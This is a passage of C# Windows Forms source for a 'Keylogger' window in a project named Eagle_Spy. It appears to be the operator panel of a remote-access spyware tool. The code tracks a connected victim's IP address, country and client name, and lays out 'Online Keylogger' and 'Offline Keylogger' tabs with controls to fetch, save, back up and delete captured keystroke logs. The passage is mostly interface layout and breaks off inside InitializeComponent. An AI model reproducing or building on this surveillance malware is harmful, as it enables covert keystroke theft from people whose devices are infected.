using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class Keylogger : Form
{
    public delegate void OffLOG(object[] objs);

    public delegate void clearold();

    private IContainer components;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("TOpacity")]
    private System.Windows.Forms.Timer _TOpacity;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("SaveToolStripMenuItem")]
    private ToolStripMenuItem _SaveToolStripMenuItem;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("SaveAsToolStripMenuItem")]
    private ToolStripMenuItem _SaveAsToolStripMenuItem;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("getbtn")]
    private Button _getbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Button2")]
    private Button _Button2;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("savedbtn")]
    private Button _savedbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("delbtn")]
    private Button _delbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("deleteallbtn")]
    private Button _deleteallbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("backallbtn")]
    private Button _backallbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("clearsrchbtn")]
    private DrakeUIAvatar _clearsrchbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("searchtext")]
    private DrakeUITextBox _searchtext;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("searchbtn")]
    private DrakeUIAvatar _searchbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("exitbtn")]
    private DrakeUIButtonIcon _exitbtn;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("DrakeUIButtonIcon1")]
    private DrakeUIButtonIcon _DrakeUIButtonIcon1;

    public TcpClient Client;

    public Client classClient;

    public string Title;

    public bool IsActive;

    public string tmpFolderUSER;

    public string tmpClientName;

    public string tmpCountry;

    public string tmpAddressIP;

    private List<DataGridViewRow> searchbefore;

    private int lastFoundIndex;

    internal System.Windows.Forms.Timer TOpacity
    ;

    [field: AccessedThroughProperty("DGV0")]
    internal DataGridView DGV0
    ;

    [field: AccessedThroughProperty("ctxMenu")]
    internal ContextMenuStrip ctxMenu
    ;

    internal ToolStripMenuItem SaveToolStripMenuItem
    ;

    internal ToolStripMenuItem SaveAsToolStripMenuItem
    ;


    [field: AccessedThroughProperty("combologs")]
    internal DrakeUIComboBox combologs
    ;

    internal Button getbtn
    ;

    [field: AccessedThroughProperty("Panel1")]
    internal Panel Panel1
        ;

    internal Button Button2
    ;

    [field: AccessedThroughProperty("keytabs")]
    internal DrakeUITabControl keytabs
    ;


    [field: AccessedThroughProperty("TabPage3")]
    internal TabPage TabPage3
    ;


    [field: AccessedThroughProperty("TabPage4")]
    internal TabPage TabPage4
    ;

    [field: AccessedThroughProperty("loadinglogs")]
    internal DrakeUILoadingBar loadinglogs
    ;

    internal Button savedbtn
    ;

    [field: AccessedThroughProperty("Column1")]
    internal DataGridViewTextBoxColumn Column1
        ;

    [field: AccessedThroughProperty("Column6")]
    internal DataGridViewTextBoxColumn Column6


    ;

    [field: AccessedThroughProperty("Column3")]
    internal DataGridViewTextBoxColumn Column3
    ;

    [field: AccessedThroughProperty("Column2")]
    internal DataGridViewImageColumn Column2
        ;

    internal Button delbtn
    ;


    internal Button deleteallbtn
    ;

    internal Button backallbtn
    ;

    [field: AccessedThroughProperty("Panel2")]
    internal Panel Panel2
    ;

    [field: AccessedThroughProperty("ClientPic")]
    internal PictureBox ClientPic
    ;

    [field: AccessedThroughProperty("clinameinfo")]
    internal Label clinameinfo
    ;

    [field: AccessedThroughProperty("Panel3")]
    internal Panel Panel3
    ;

    internal DrakeUIAvatar clearsrchbtn
    ;

    internal DrakeUITextBox searchtext
;

    internal DrakeUIAvatar searchbtn
    ;

    [field: AccessedThroughProperty("offlinetext")]
    internal RichTextBox offlinetext
        ;

    internal DrakeUIButtonIcon exitbtn
    ;
    internal Button button1;
    internal DrakeUIButtonIcon DrakeUIButtonIcon1
    ;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        try
        {
            if (disposing && components != null)
                components.Dispose();
        }
        finally
        {
            base.Dispose(disposing);
        }
    }

    [System.Diagnostics.DebuggerStepThrough]
    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.DGV0 = new System.Windows.Forms.DataGridView();
            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column2 = new System.Windows.Forms.DataGridViewImageColumn();
            this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.loadinglogs = new DrakeUI.Framework.DrakeUILoadingBar();
            this.deleteallbtn = new System.Windows.Forms.Button();
            this.backallbtn = new System.Windows.Forms.Button();
            this.delbtn = new System.Windows.Forms.Button();
            this.savedbtn = new System.Windows.Forms.Button();
            this.getbtn = new System.Windows.Forms.Button();
            this.combologs = new DrakeUI.Framework.DrakeUIComboBox();
            this.Button2 = new System.Windows.Forms.Button();
            this.keytabs = new DrakeUI.Framework.DrakeUITabControl();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.TabPage4 = new System.Windows.Forms.TabPage();
            this.offlinetext = new System.Windows.Forms.RichTextBox();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.clearsrchbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
            this.searchbtn = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.clinameinfo = new System.Windows.Forms.Label();
            this.exitbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.DGV0)).BeginInit();
            this.ctxMenu.SuspendLayout();
            this.Panel1.SuspendLayout();
            this.keytabs.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.TabPage4.SuspendLayout();
            this.Panel3.SuspendLayout();
            this.Panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.SuspendLayout();
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // DGV0
            // 
            this.DGV0.AllowUserToAddRows = false;
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGV0.BackgroundColor = System.Drawing.Color.Black;
            this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
            this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGV0.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column1,
            this.Column6,
            this.Column3,
            this.Column2});
            dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Red;
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGV0.DefaultCellStyle = dataGridViewCellStyle5;
            this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGV0.EnableHeadersVisualStyles = false;
            this.DGV0.GridColor = System.Drawing.Color.Red;
            this.DGV0.Location = new System.Drawing.Point(0, 0);
            this.DGV0.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.DGV0.Name = "DGV0";
            this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.DGV0.RowHeadersVisible = false;
            this.DGV0.RowHeadersWidth = 51;
            dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle6;
            this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new System.Drawing.Size(1139, 767);
            this.DGV0.TabIndex = 4;
            // 
            // Column1
            // 
            this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.Column1.HeaderText = "Status";
            this.Column1.MinimumWidth = 6;
            this.Column1.Name = "Column1";
            // 
            // Column6
            // 
            this.Column6.HeaderText = "App Name";
            this.Column6.MinimumWidth = 6;
            this.Column6.Name = "Column6";
            // 
            // Column3
            // 
            this.Column3.FillWeight = 250F;
            this.Column3.HeaderText = "Text";
            this.Column3.MinimumWidth = 6;
            this.Column3.Name = "Column3";
            // 
            // Column2
            // 
            this.Column2.FillWeight = 1F;
            this.Column2.HeaderText = "";
            this.Column2.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
            this.Column2.MinimumWidth = 2;
            this.Column2.Name = "Column2";
            this.Column2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
            // 
            // ctxMenu
            // 
            this.ctxMenu.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.SaveToolStripMenuItem,
            this.SaveAsToolStripMenuItem});
            this.ctxMenu.Name = "ctxMenu";
            this.ctxMenu.ShowImageMargin = false;
            this.ctxMenu.Size = new System.Drawing.Size(105, 52);
            // 
            // SaveToolStripMenuItem
            // 
            this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
            this.SaveToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
            this.SaveToolStripMenuItem.Text = "Save";
            this.SaveToolStripMenuItem.Visible = false;
            this.SaveToolStripMenuItem.Click += new System.EventHandler(this.SaveToolStripMenuItem_Click);
            // 
            // SaveAsToolStripMenuItem
            // 
            this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
            this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
            this.SaveAsToolStripMenuItem.Text = "Save As";
            this.SaveAsToolStripMenuItem.Visible = false;
            this.SaveAsToolStripMenuItem.Click += new System.EventHandler(this.SaveAsToolStripMenuItem_Click);
            // 
            // Panel1
            // 
            this.Panel1.Controls.Add(this.loadinglogs);
            this.Panel1.Controls.Add(this.deleteallbtn);
            this.Panel1.Controls.Add(this.backallbtn);
            this.Panel1.Controls.Add(this.delbtn);
            this.Panel1.Controls.Add(this.savedbtn);
            this.Panel1.Controls.Add(this.getbtn);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel1.Location = new System.Drawing.Point(0, 755);
            this.Panel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(1139, 12);
            this.Panel1.TabIndex = 3;
            this.Panel1.Visible = false;
            // 
            // loadinglogs
            // 
            this.loadinglogs.BackColor = System.Drawing.Color.Transparent;
            this.loadinglogs.Dock = System.Windows.Forms.DockStyle.Right;
            this.loadinglogs.Enabled = false;
            this.loadinglogs.Font = new System.Drawing.Font("Calibri", 12F);
            this.loadinglogs.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.loadinglogs.Location = new System.Drawing.Point(828, 0);
            this.loadinglogs.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.loadinglogs.Name = "loadinglogs";
            this.loadinglogs.Size = new System.Drawing.Size(40, 12);
            this.loadinglogs.Style = DrakeUI.Framework.UIStyle.Custom;
            this.loadinglogs.StyleCustomMode = true;
            this.loadinglogs.TabIndex = 4;
            this.loadinglogs.Text = "DrakeUILoadingBar1";
            this.loadinglogs.Visible = false;
            // 
            // deleteallbtn
            // 
            this.deleteallbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.deleteallbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.deleteallbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.deleteallbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.deleteallbtn.Location = new System.Drawing.Point(868, 0);
            this.deleteallbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.deleteallbtn.Name = "deleteallbtn";
            this.deleteallbtn.Size = new System.Drawing.Size(99, 12);
            this.deleteallbtn.TabIndex = 8;
            this.deleteallbtn.Text = "Delete all";
            this.deleteallbtn.UseVisualStyleBackColor = true;
            this.deleteallbtn.Visible = false;
            this.deleteallbtn.Click += new System.EventHandler(this.Button3_Click_1);
            // 
            // backallbtn
            // 
            this.backallbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.backallbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.backallbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.backallbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.backallbtn.Location = new System.Drawing.Point(967, 0);
            this.backallbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.backallbtn.Name = "backallbtn";
            this.backallbtn.Size = new System.Drawing.Size(99, 12);
            this.backallbtn.TabIndex = 7;
            this.backallbtn.Text = "Backup all";
            this.backallbtn.UseVisualStyleBackColor = true;
            this.backallbtn.Click += new System.EventHandler(this.Backallbtn_Click);
            // 
            // delbtn
            // 
            this.delbtn.Dock = System.Windows.Forms.DockStyle.Left;
            this.delbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.delbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.delbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.delbtn.Location = new System.Drawing.Point(115, 0);
            this.delbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.delbtn.Name = "delbtn";
            this.delbtn.Size = new System.Drawing.Size(125, 12);
            this.delbtn.TabIndex = 6;
            this.delbtn.Text = "Delete Selected";
            this.delbtn.UseVisualStyleBackColor = true;
            this.delbtn.Visible = false;
            this.delbtn.Click += new System.EventHandler(this.Delbtn_Click);
            // 
            // savedbtn
            // 
            this.savedbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.savedbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.savedbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.savedbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.savedbtn.Location = new System.Drawing.Point(1066, 0);
            this.savedbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.savedbtn.Name = "savedbtn";
            this.savedbtn.Size = new System.Drawing.Size(73, 12);
            this.savedbtn.TabIndex = 5;
            this.savedbtn.Text = "Saved";
            this.savedbtn.UseVisualStyleBackColor = true;
            this.savedbtn.Click += new System.EventHandler(this.Button3_Click);
            // 
            // getbtn
            // 
            this.getbtn.Dock = System.Windows.Forms.DockStyle.Left;
            this.getbtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.getbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.getbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.getbtn.Location = new System.Drawing.Point(0, 0);
            this.getbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.getbtn.Name = "getbtn";
            this.getbtn.Size = new System.Drawing.Size(115, 12);
            this.getbtn.TabIndex = 0;
            this.getbtn.Text = "Get Selected";
            this.getbtn.UseVisualStyleBackColor = true;
            this.getbtn.Click += new System.EventHandler(this.getbtn_click);
            // 
            // combologs
            // 
            this.combologs.AllowDrop = true;
            this.combologs.BackColor = System.Drawing.Color.Transparent;
            this.combologs.CausesValidation = false;
            this.combologs.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.combologs.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.combologs.Font = new System.Drawing.Font("Calibri", 11F);
            this.combologs.FormattingEnabled = true;
            this.combologs.ItemHeight = 20;
            this.combologs.Location = new System.Drawing.Point(180, 5);
            this.combologs.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.combologs.MaxDropDownItems = 100000;
            this.combologs.MinimumSize = new System.Drawing.Size(63, 0);
            this.combologs.Name = "combologs";
            this.combologs.Padding = new System.Windows.Forms.Padding(0, 0, 40, 0);
            this.combologs.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            this.combologs.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.combologs.Size = new System.Drawing.Size(480, 30);
            this.combologs.Style = DrakeUI.Framework.UIStyle.Custom;
            this.combologs.TabIndex = 2;
            this.combologs.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // Button2
            // 
            this.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Button2.ForeColor = System.Drawing.Color.Cyan;
            this.Button2.Location = new System.Drawing.Point(816, 190);
            this.Button2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Button2.Name = "Button2";
            this.Button2.Size = new System.Drawing.Size(169, 32);
            this.Button2.TabIndex = 3;
            this.Button2.Text = "Delete log";
            this.Button2.UseVisualStyleBackColor = true;
            this.Button2.Visible = false;
            this.Button2.Click += new System.EventHandler(this.Button2_Click);
            // 
            // keytabs
            // 
            this.keytabs.Controls.Add(this.TabPage3);
            this.keytabs.Controls.Add(this.TabPage4);
            this.keytabs.Dock = System.Windows.Forms.DockStyle.Fill;
            this.keytabs.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            this.keytabs.FillColor = System.Drawing.Color.Black;
            this.keytabs.Font = new System.Drawing.Font("Calibri", 12F);
            this.keytabs.ItemSize = new System.Drawing.Size(470, 40);
            this.keytabs.Location = new System.Drawing.Point(0, 42);
            this.keytabs.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.keytabs.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
            this.keytabs.Name = "keytabs";
            this.keytabs.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.keytabs.SelectedIndex = 0;
            this.keytabs.Size = new System.Drawing.Size(1139, 807);
            this.keytabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.keytabs.Style = DrakeUI.Framework.UIStyle.Custom;
            this.keytabs.StyleCustomMode = true;
            this.keytabs.TabBackColor = System.Drawing.Color.Black;
            this.keytabs.TabIndex = 4;
            this.keytabs.TabSelectedColor = System.Drawing.Color.Black;
            this.keytabs.TabSelectedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.keytabs.TabSelectedHighColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.keytabs.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
            // 
            // TabPage3
            // 
            this.TabPage3.BackColor = System.Drawing.Color.Black;
            this.TabPage3.Controls.Add(this.DGV0);
            this.TabPage3.Location = new System.Drawing.Point(0, 40);
            this.TabPage3.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(1139, 767);
            this.TabPage3.TabIndex = 0;
            this.TabPage3.Text = "Online Keylogger";
            // 
            // TabPage4
            // 
            this.TabPage4.BackColor = System.Drawing.Color.Black;
            this.TabPage4.Controls.Add(this.offlinetext);
            this.TabPage4.Controls.Add(this.Panel3);
            this.TabPage4.Controls.Add(this.Panel1);
            this.TabPage4.Controls.Add(this.Button2);
            this.TabPage4.Location = new System.Drawing.Point(0, 40);
            this.TabPage4.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.TabPage4.Name = "TabPage4";
            this.TabPage4.Size = new System.Drawing.Size(1139, 767);
            this.TabPage4.TabIndex = 1;
            this.TabPage4.Text = "Offline Keylogger";
            // 
            // offlinetext
            // 
            this.offlinetext.BackColor = System.Drawing.Color.Black;
            this.offlinetext.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.offlinetext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.offlinetext.ForeColor = System.Drawing.Color.Lime;
            this.offlinetext.Location = new System.Drawing.Point(0, 39);
            this.offlinetext.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.offlinetext.Name = "offlinetext";
            this.offlinetext.ReadOnly = true;
            this.offlinetext.Size = new System.Drawing.Size(1139, 716);
            this.offlinetext.TabIndex = 5;
            this.offlinetext.Text = "";
            // 
            // Panel3
            // 
            this.Panel3.Controls.Add(this.button1);
            this.Panel3.Controls.Add(this.clearsrchbtn);
            this.Panel3.Controls.Add(this.searchtext);
            this.Panel3.Controls.Add(this.searchbtn);
            this.Panel3.Controls.Add(this.combologs);
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel3.Location = new System.Drawing.Point(0, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(1139, 39);
            this.Panel3.TabIndex = 4;
            // 
            // button1
            // 
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Calibri", 9F);
            this.button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.button1.Location = new System.Drawing.Point(72, 2);
            this.button1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(87, 34);
            this.button1.TabIndex = 40;
            this.button1.Text = "GET";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // clearsrchbtn
            // 
            this.clearsrchbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.clearsrchbtn.AvatarSize = 25;
            this.clearsrchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clearsrchbtn.FillColor = System.Drawing.Color.Black;
            this.clearsrchbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.clearsrchbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.clearsrchbtn.Location = new System.Drawing.Point(1096, 9);
            this.clearsrchbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.clearsrchbtn.Name = "clearsrchbtn";
            this.clearsrchbtn.Size = new System.Drawing.Size(27, 26);
            this.clearsrchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.clearsrchbtn.StyleCustomMode = true;
            this.clearsrchbtn.Symbol = 77;
            this.clearsrchbtn.SymbolSize = 30;
            this.clearsrchbtn.TabIndex = 39;
            this.clearsrchbtn.Visible = false;
            this.clearsrchbtn.Click += new System.EventHandler(this.Clearsrchbtn_Click);
            // 
            // searchtext
            // 
            this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.searchtext.FillColor = System.Drawing.Color.Black;
            this.searchtext.Font = new System.Drawing.Font("Calibri", 9F);
            this.searchtext.ForeColor = System.Drawing.Color.White;
            this.searchtext.Location = new System.Drawing.Point(760, 9);
            this.searchtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.searchtext.Maximum = 2147483647D;
            this.searchtext.Minimum = -2147483648D;
            this.searchtext.Name = "searchtext";
            this.searchtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.searchtext.Radius = 15;
            this.searchtext.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.searchtext.Size = new System.Drawing.Size(332, 26);
            this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
            this.searchtext.StyleCustomMode = true;
            this.searchtext.TabIndex = 37;
            this.searchtext.Watermark = "Search offline keyloger";
            this.searchtext.TextChanged += new System.EventHandler(this.Searchtext_TextChanged);
            // 
            // searchbtn
            // 
            this.searchbtn.AvatarSize = 25;
            this.searchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.searchbtn.FillColor = System.Drawing.Color.Black;
            this.searchbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.searchbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.searchbtn.Location = new System.Drawing.Point(717, 4);
            this.searchbtn.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.searchbtn.Name = "searchbtn";
            this.searchbtn.Size = new System.Drawing.Size(33, 32);
            this.searchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.searchbtn.StyleCustomMode = true;
            this.searchbtn.Symbol = 85;
            this.searchbtn.SymbolSize = 30;
            this.searchbtn.TabIndex = 38;
            this.searchbtn.Click += new System.EventHandler(this.Searchbtn_Click);
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.clinameinfo);
            this.Panel2.Controls.Add(this.exitbtn);
            this.Panel2.Controls.Add(this.DrakeUIButtonIcon1);
            this.Panel2.Controls.Add(this.ClientPic);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel2.ForeColor = System.Drawing.Color.Red;
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(1139, 42);
            this.Panel2.TabIndex = 5;
            // 
            // clinameinfo
            // 
            this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
